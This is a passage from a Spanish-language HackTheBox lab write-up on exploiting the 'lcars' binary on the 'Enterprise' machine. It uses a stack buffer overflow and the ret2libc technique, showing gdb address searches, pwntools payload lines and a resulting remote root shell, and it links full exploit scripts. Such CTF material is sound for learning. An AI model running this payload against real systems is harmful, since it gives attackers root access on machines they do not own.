(Enviamos 200 **C**'s y en **gdb** le indicamos que nos muestre 80 direcciones, pero que empiece a contar 50 antes de llegar al **esp** (esto para poder ver el contenido del **ebp** y el **eip**))

* [Buffer overflow y Shellcode](https://www.ellaberintodefalken.com/2013/07/vulnerabilidades-shellcode-buffer-overflow.html).

![112bash_gdb_content_esp_eip_ebp](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_gdb_content_esp_eip_ebp.png)

:P

...

Echémosle un ojo a las protecciones que tiene el binario:

> SPAM: [Acá tengo otro writeup de un reto en especifico sobre **Buffer Overflow**](https://lanzt.github.io/blog/ctf/CTF-PicoCTF2019-Overflow1).

```bash
❭ checksec lcars
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

* **RELRO**: Al estar en **Partial** nos permite sobreescribir direcciones del [global offset table](https://en.wikipedia.org/wiki/Global_Offset_Table).
* **Stack**: Nos despreocupamos (ya que está desactivada :P) de una dirección que se crea antes de llegar al final del `Stack`, ya que puede darnos problemas.
* **NX**: El **Stack** es ejecutable, por lo tanto podríamos enviar **shellcodes** y código malicioso para ejecutarlo en el binario.
* **PIE**: Pero tenemos de manera randomizada la [Virtual Address Place](https://en.wikipedia.org/wiki/Virtual_address_space) del binario.

Bien, ahora lo que nos queda es jugar con la dirección del registro **eip** y ver como podemos ejecutar comandos jugando con el stack y las direcciones locas...

**En este caso no podemos hacer el típico ataque BOF (de los CTF's) de movernos a una función llamada **vuln** o llamada **flag** para que nos muestre lo que queremos, nop, en este caso debemos buscar un poco más para ver como ejecutar comandos ya sea con expresiones externas o con el mismo programa...**

Leyendo un poco encontré un ataque llamado [Ret2libc](https://www.hackplayers.com/2021/01/taller-de-exploiting-ret2libc-en-linux-x64.html) que se basa en ejecutar código que ya existe en la memoria, mejor dicho, funciones del propio programa :)

> Pa leer: [Mi primer buffer overflow](https://ironhackers.es/tutoriales/introduccion-al-exploiting-parte-3-mi-primer-buffer-overflow-stack-5-protostar/).

Para ejecutar esto, debemos buscar si existe alguna función importante en memoria, encontramos este recurso que nos explica detalladamente lo peligrosas que pueden ser las funciones del propio programa/librería:

* [Binary Exploitation Data-Execution-Prevention](https://medium.com/swlh/binary-exploitation-data-execution-prevention-cc47edf2033b#e300).

Nos indican que debemos buscar la función `system()`, que ejecuta comandos en el sistema:

```bash
pwndbg> print system
$1 = {int (const char *)} 0xf7d7ffa0 <__libc_system>
```

Bien, tenemos una dirección en memoria de la función `system()`. Ahora debemos encontrar alguna referencia hacia "`/bin/bash`" o "`/bin/sh`", para asi obtener una **Shell** cuando ejecutemos nuestro exploit:

```bash
pwndbg> find "/bin/bash"
Argument required (expression to compute).
```

Siguiendo [esta descripción de **find**](https://sourceware.org/gdb/current/onlinedocs/gdb/Searching-Memory.html), debemos pasarle dos argumentos más para que haga la búsqueda de memoria correctamente: 

> find [/sn] start_addr, +len, val1 [, val2, …]

Entonces podemos indicarle que la dirección de inicio sea la que encontramos (`system`) (asi solo no sirve, debemos agregarle `+len`) y le pasamos que el tamaño sea de **8** bytes:

```bash
pwndbg> find 0xf7d7ffa0,+12345678,"/bin/bash"
warning: Unable to access 16000 bytes of target memory at 0xf7f21f29, halting search.
Pattern not found.
```

Parece que ya está funcionando, busquemos `/bin/sh`:

```bash
pwndbg> find 0xf7d7ffa0,+12345678,"/bin/sh"
0xf7ec733c
warning: Unable to access 16000 bytes of target memory at 0xf7f210c4, halting search.
1 pattern found.
```

Perfecto, encontramos una dirección en memoria donde se hace referencia a `/bin/sh`, también nos la guardamos :) Vemos que tenemos y vamos organizando el script:

* Dirección función **system()**, que nos servirá para ejecutar la Shell (`/bin/sh`): `0xf7d7ffa0`.
* Dirección llamado `/bin/sh`: `0xf7ec733c`.

Para que las direcciones no sean dinámicas, debemos validar el [ASLR](https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones) que esté desactivado:

**(Esto en mi máquina, pero también debemos validarlo en el sistema vulnerable.)**

```bash
❭ cat /proc/sys/kernel/randomize_va_space
0
```

Si está en **2** está activado y deberíamos pasarlo a **0** (o bypassearlo), pero por ahora tamos bien, validemos ahora el de **enterprise.htb**:

```bash
www-data@enterprise:/var/www/html/files$ cat /proc/sys/kernel/randomize_va_space
0
```

Listo, sin problemas.

...

Entonces nuestro script tendría estas nuevas líneas:

```py
...
payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
payload += p32(0xf7d7ffa0, endian='little') # system()
payload += p32(0xf7ec733c, endian='little') # /bin/sh
...
```

Ahora podemos empezar a probar sin tener de intermediario a **gdb**:

```bash
❭ python3 exploit.py ./lcars
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Starting local process './lcars': pid 1125113
[*] Switching to interactive mode

sh: 1: \x13 not found
[*] Got EOF while reading in interactive
$ id
[*] Process './lcars' stopped with exit code -11 (SIGSEGV) (pid 1125113)
[*] Got EOF while sending in interactive
```

Tenemos un error: **sh: 1: \x13 not found**... Buscando más ejemplos sobre el ataque encontramos este recurso:

* [Linux Classic - return2libc.pdf](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf).

Donde ejecuta prácticamente los mismos pasos, busca la dirección en memoria de la función `system()` y algo relacionado con "`/bin/sh`", peeeero entre medio de los dos pasa **4 bytes** (8 bits) basura, algo asi como:

```py
...
payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
payload += p32(0xf7d7ffa0, endian='little') # system()
payload = ("B"*4).encode() # + Basurita en bytes
payload += p32(0xf7ec733c, endian='little') # /bin/sh
...
```

Entonces (leyendo artículos):

> "So our next 4 bytes will be either a valid return adress (perhaps another C library function ^^?), or some random garbage", tomado de [Exploiting Techniques - ret2libc](https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833).

Como bien dice ahí, los siguientes 4 bytes despues de la función `system()` podrían ser o basura o alguna otra función del programa, pero debe ir algo (:

Listo, ejecutemos:

```bash
❭ python3 exploit.py ./lcars
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Starting local process './lcars': pid 1163091
[*] Switching to interactive mode

$ whoami
root
$ hostname -I
10.10.14.17
$  
```

Bieeeeeeeeeeeeeeeen, tenemos una `/bin/sh`, en este caso en nuestra máquina, pero ya podríamos indicarle el argumento **REMOTE**, para que tome la dirección IP y el puerto de la máquina víctima:

```bash
❭ python3 exploit.py ./lcars REMOTE
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 10.10.10.61 on port 32812: Done
[*] Switching to interactive mode

[*] Got EOF while reading in interactive
$ id
$ 
[*] Closed connection to 10.10.10.61 port 32812
[*] Got EOF while sending in interactive
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112sad_ok.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Jmmm, dando unas vueltas cai en cuenta que el programa está tomando **nuestras** direcciones en memoria, o sea con las que interactúa el programa en **nuestro sistema**, tiene sentido que no sirva, ya que esas **direcciones** probablemente no sean las mismas que usa el programa en la máquina víctima... Juguemos con ella (ya que tiene **gdb**) para extraer las direcciones en memoria y validar si ese es el error:

```bash
www-data@enterprise:/bin$ gdb ./lcars -q
Reading symbols from ./lcars...(no debugging symbols found)...done.
(gdb)
```

Para obtener todos los valores necesitamos que el programa se ejecute y tenga un **breakpoint** (este para obtener "/bin/sh"), asi que hacemos todo el recorrido (código > 4 > cadena en el apartado *seguridad*) y ahí si jugamos:

```bash
...
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
(gdb) find 0xf7e4c060,+87654321,"/bin/sh"
warning: Unable to access 16000 bytes of target memory at 0xf7f55a67, halting search.
Pattern not found.
(gdb) b main
Breakpoint 1 at 0x56555ca0
(gdb) r
Starting program: /bin/lcars 

Breakpoint 1, 0x56555ca0 in main ()
(gdb) find 0xf7e4c060,+87654321,"/bin/sh"
0xf7f70a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
1 pattern found.
(gdb) 
```

Bien, ya tenemos los 2 valores:

* `system()`: `0xf7e4c060`.
* `/bin/sh`: `0xf7f70a0f`.

Agreguémoslos al script y ejecutemos :O

```py
...
payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
payload += p32(0xf7e4c060, endian='little') # System
payload += ("B"*4).encode() # + basurita
payload += p32(0xf7f70a0f, endian='little') # /bin/sh
...
```

```bash
❭ python3 exploit.py ./lcars REMOTE
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 10.10.10.61 on port 32812: Done
[*] Switching to interactive mode

[*] Got EOF while reading in interactive
$ id
$ 
[*] Closed connection to 10.10.10.61 port 32812
[*] Got EOF while sending in interactive
```

Pero tampoco... Guiándome por algunos post, algunos simplemente buscaban la cadena "`sh`" (haciendo referencia a la `/bin/sh`), intentemos buscar esa cadena:

```bash
(gdb) find 0xf7e4c060,+87654321,"sh"
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
4 patterns found.
```

Hay 4 coincidencias en memoria, tomemos la primera y remplacémosla por la dirección `/bin/sh` que teníamos:

```bash
❭ python3 exploit.py ./lcars REMOTE
[*] '/htb/enterprise/scripts/lcars'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 10.10.10.61 on port 32812: Done
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)
$ hostname -I
10.10.10.61 172.17.0.1 dead:beef::250:56ff:feb9:7ba 
$ hostname
enterprise.htb
$  
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112boom.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

PERF3ct0000000000oooOOOOOOOOoooooooVoooo.............

Tenemos una `sh` en la máquina víctima aprovechándonos de un buffer overflow con el ataque **ret2libc** (: que belleza eh!

**(Probando con las 4 direcciones que encontramos relacionadas con `sh`, la única que da problemas es `0xf7f70a14`, de resto también obtenemos una Shell 😊)**

> [exploitBOF.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/exploitBOF.py)

Solo nos quedaría ver las flags:

![112flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112flags.png)

...

Creamos un script para elegir en que sistema queremos ejecutar comandos remotamente, ya sea en el contenedor que tiene **WordPress**, el que tiene **Joomla** o contra el propio **host**:

> [RCE_word_joom_host.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/RCE_word_joom_host.py)

...

Ufff, que locura no? Me disculpo si escribí mucho, pero como digo siempre, prefiero hacerlo asi para que sea más didáctico y se puedan ver errores y explicaciones extras (que nunca vienen mal). Me gusto mucho la máquina en general, algo raro el tema del SQL (que me funciono con mi sentencia normal, pero despues se pudrió todo y toco concatenarle cositas), pero se aprende a jugar con sentencias. La parte del **BOF** estuvo brutal, es la primera máquina en la que tengo que jugar con algo asi, ya que en [Buff](https://lanzt.github.io/blog/htb/HackTheBox-Buff) debíamos explotar un exploit conocido relacionado con **Buffer overflow**, pero no debíamos hacerlo tan manual, asi que estuvo increíble.

Y bueno, como siempre y como nunca, a seguir rompiendo todo!! Bless